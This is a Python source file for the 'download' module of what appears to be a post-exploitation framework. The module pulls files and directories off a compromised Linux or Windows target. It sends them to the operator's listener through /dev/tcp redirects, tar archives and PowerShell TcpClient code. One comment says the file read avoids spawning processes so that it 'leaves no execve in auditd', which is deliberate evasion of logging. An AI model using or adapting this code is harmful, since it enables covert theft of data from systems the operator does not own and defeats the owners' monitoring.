from __future__ import annotations

import io
import ntpath
import os
import posixpath
import tarfile
import zipfile

from koi.modules.blueprint import KoiModule, TCPReceiveServer
from koi.utils.config import TIMEOUTS

_DIR_TIMEOUT = max(TIMEOUTS.get("download", 300) * 2, 600)


def _remote_basename(path: str) -> str:
    stripped = path.rstrip("/\\")
    return ntpath.basename(stripped) or posixpath.basename(stripped) or "download"


class DownloadModule(KoiModule):
    name = "download"
    description = "Download a file or directory from the target."
    usage = "download <id> <remote_path> [-o <local_path>]"
    category = "File transfer"
    platform = ["linux", "windows_ps"]
    arguments = [
        {
            "flags": ["remote_path"],
            "help": "Remote file or directory path (. and .. work)",
            "nargs": "+",
        },
        {"flags": ["-o", "--output"], "default": None, "help": "Local output path"},
    ]

    def run(self) -> None:
        remote_path = " ".join(self.args.remote_path)
        local_ip    = self._get_local_ip()
        os_type     = self.session.os_type
        quoted      = self._shell_quote(remote_path)
        ps_path     = self._ps_quote(remote_path)

        # 1. ONE command: type + resolved path + size
        with self.spinner("Checking remote path..."):
            if os_type == "linux":
                check = self._exec_clean(
                    f"if [ -d {quoted} ]; then"
                    f" _a=$(cd {quoted} && pwd);"
                    f" printf 'dir\t%s\t%s\n' \"$_a\" \"$(du -sb \"$_a\" 2>/dev/null|cut -f1)\";"
                    f"elif [ -f {quoted} ]; then"
                    f" printf 'file\t%s\t%s\n' {quoted} \"$(wc -c <{quoted} 2>/dev/null)\";"
                    f"else echo not_found; fi"
                ).strip()
                if check == "not_found" or not check:
                    self.err(f"Remote path not found: {remote_path}")
                    return
                parts = check.split("\t", 2)
                if len(parts) < 3:
                    self.err(f"Unexpected response from target: {check!r}")
                    return
                path_type, resolved, size_raw = parts
                is_dir      = (path_type == "dir")
                remote_path = resolved.strip()
                quoted      = self._shell_quote(remote_path)
                try:
                    remote_size: int | None = int(size_raw.strip().split()[0])
                except (ValueError, IndexError):
                    remote_size = None

            else:
                check = self._win_query(
                    f"try{{"
                    f"$_i=Get-Item -LiteralPath '{ps_path}' -Force -EA Stop;"
                    f"if($_i.PSIsContainer){{"
                    f"  $_s=(Get-ChildItem -LiteralPath '{ps_path}' -Recurse -File -Force"
                    f"    -EA SilentlyContinue|Measure-Object -Property Length -Sum).Sum;"
                    f"  'dir'+[char]9+$_i.FullName+[char]9+$_s"
                    f"}}else{{"
                    f"  'file'+[char]9+$_i.FullName+[char]9+$_i.Length"
                    f"}}}}catch{{'not_found'}}"
                ).strip()
                if check == "not_found":
                    self.err(f"Remote path not found: {remote_path}")
                    return
                parts = check.split("\t", 2)
                if len(parts) < 3:
                    self.err(f"Unexpected response from target: {check!r}")
                    return
                path_type, resolved, size_raw = parts
                is_dir      = (path_type == "dir")
                remote_path = resolved.strip()
                ps_path     = self._ps_quote(remote_path)
                try:
                    remote_size = int(size_raw.strip())
                except (ValueError, AttributeError):
                    remote_size = None

        # 2. Local output path
        local_out = self.args.output or _remote_basename(remote_path)

        if not is_dir:
            bar = self.ui.ProgressBar(total=remote_size or 0)
            with TCPReceiveServer(
                timeout=TIMEOUTS.get("download", 300), on_progress=bar.update
            ) as srv:
                port = srv.port
                self.status(
                    f"Downloading {remote_path}"
                    + (f" ({remote_size} bytes)" if remote_size else "")
                    + "..."
                )
                if os_type == "linux":
                    # builtin-only read (no cat) so the file transfer leaves no execve in auditd
                    cmd = (
                        f"LC_ALL=C; {{ while IFS= read -r -d '' c; do printf '%s\\0' \"$c\"; done; "
                        f"[ -n \"$c\" ] && printf '%s' \"$c\"; }} < {quoted}"
                        f" > /dev/tcp/{local_ip}/{port}"
                    )
                    self.exec(cmd, timeout=TIMEOUTS.get("download", 300))
                else:
                    ps_cmd = (
                        f"$_c=New-Object Net.Sockets.TcpClient('{local_ip}',{port});"
                        f"$_s=$_c.GetStream();"
                        f"$_f=[IO.File]::OpenRead((Get-Item '{ps_path}').FullName);"
                        f"$_b=New-Object byte[] 65536;"
                        f"while(($_n=$_f.Read($_b,0,$_b.Length))-gt 0){{$_s.Write($_b,0,$_n)}};"
                        f"$_f.Close();$_s.Flush();$_c.Close()"
                    )
                    self._dispatch_ps(ps_cmd)

                try:
                    raw = srv.collect()
                except (RuntimeError, TimeoutError) as exc:
                    self.err(f"Transfer failed: {exc}")
                    return

            bar.done()
            print()

            if remote_size is not None and len(raw) != remote_size:
                self.err(
                    f"Size mismatch: expected {remote_size} bytes, got {len(raw)} — file not saved."
                )
                return

            try:
                with open(local_out, "wb") as f:
                    f.write(raw)
            except OSError as exc:
                self.err(f"Could not write {local_out}: {exc}")
                return

            self.box("Download complete", {
                "remote path": remote_path,
                "local path":  os.path.abspath(local_out),
                "size":        f"{len(raw):,} bytes  ({len(raw) / 1024:.1f} KB)",
            })

        else:
            bar = self.ui.ProgressBar(total=remote_size or 0)

            if os_type == "linux":
                with TCPReceiveServer(timeout=_DIR_TIMEOUT, on_progress=bar.update) as srv:
                    port = srv.port
                    self.status(
                        f"Downloading {remote_path}/"
                        + (f" ({remote_size} bytes)" if remote_size else "")
                        + "..."
                    )
                    self.exec(
                        f"tar czf - -C {quoted} . > /dev/tcp/{local_ip}/{port} 2>/dev/null",
                        timeout=_DIR_TIMEOUT,
                    )
                    try:
                        raw = srv.collect()
                    except (RuntimeError, TimeoutError) as exc:
                        self.err(f"Transfer failed: {exc}")
                        return

            else:
                with TCPReceiveServer(timeout=_DIR_TIMEOUT, on_progress=bar.update) as srv:
                    port = srv.port
                    self.status(
                        f"Downloading {remote_path}\\"
                        + (f" ({remote_size} bytes)" if remote_size else "")
                        + "..."
                    )
                    ps_cmd = (
                        f"$_src='{ps_path}';"
                        f"$_sn=$_src.TrimEnd('\\')+'\\';"
                        f"Add-Type -AssemblyName System.IO.Compression;"
                        f"$_ms=New-Object System.IO.MemoryStream;"
                        f"$_za=New-Object IO.Compression.ZipArchive($_ms,[IO.Compression.ZipArchiveMode]::Create,$true);"
                        f"Get-ChildItem -LiteralPath $_src -Recurse -File -Force -EA SilentlyContinue|%{{"
                        f"try{{"
                        f"$_r=$_.FullName.Substring($_sn.Length).Replace('\\','/');"
                        f"$_e=$_za.CreateEntry($_r,[IO.Compression.CompressionLevel]::Fastest);"
                        f"$_es=$_e.Open();"
                        f"$_fs=[IO.File]::OpenRead($_.FullName);"
                        f"$_fs.CopyTo($_es);$_fs.Close();$_es.Close()"
                        f"}}catch{{}}}};"
                        f"$_za.Dispose();"
                        f"$_b=$_ms.ToArray();$_ms.Close();"
                        f"$_tc=New-Object Net.Sockets.TcpClient('{local_ip}',{port});"
                        f"$_ns=$_tc.GetStream();"
                        f"$_ns.Write($_b,0,$_b.Length);"
                        f"$_ns.Flush();$_tc.Close()"
                    )
                    self._dispatch_ps(ps_cmd)
                    try:
                        raw = srv.collect()
                    except (RuntimeError, TimeoutError) as exc:
                        self.err(f"Transfer failed: {exc}")
                        return

            bar.done()
            print()

            if not raw:
                self.err("Received empty archive — transfer may have timed out.")
                return

            with self.spinner(f"Extracting into {local_out}/..."):
                os.makedirs(local_out, exist_ok=True)
                try:
                    if os_type == "linux":
                        with tarfile.open(fileobj=io.BytesIO(raw), mode="r:gz") as tar:
                            try:
                                tar.extractall(path=local_out, filter="data")
                            except TypeError:
                                tar.extractall(path=local_out)
                            file_count = sum(1 for m in tar.getmembers() if m.isfile())
                    else:
                        with zipfile.ZipFile(io.BytesIO(raw)) as zf:
                            zf.extractall(path=local_out)
                            file_count = sum(1 for n in zf.namelist() if not n.endswith("/"))
                except zipfile.BadZipFile as exc:
                    self.err(f"Received incomplete archive — {exc}")
                    return
                except Exception as exc:
                    self.err(f"Could not extract archive: {exc}")
                    return

            self.box("Download complete", {
                "remote path": remote_path,
                "local path":  os.path.abspath(local_out),
                "received":    f"{len(raw):,} bytes  ({len(raw) / 1024:.1f} KB)",
                "files":       str(file_count),
            })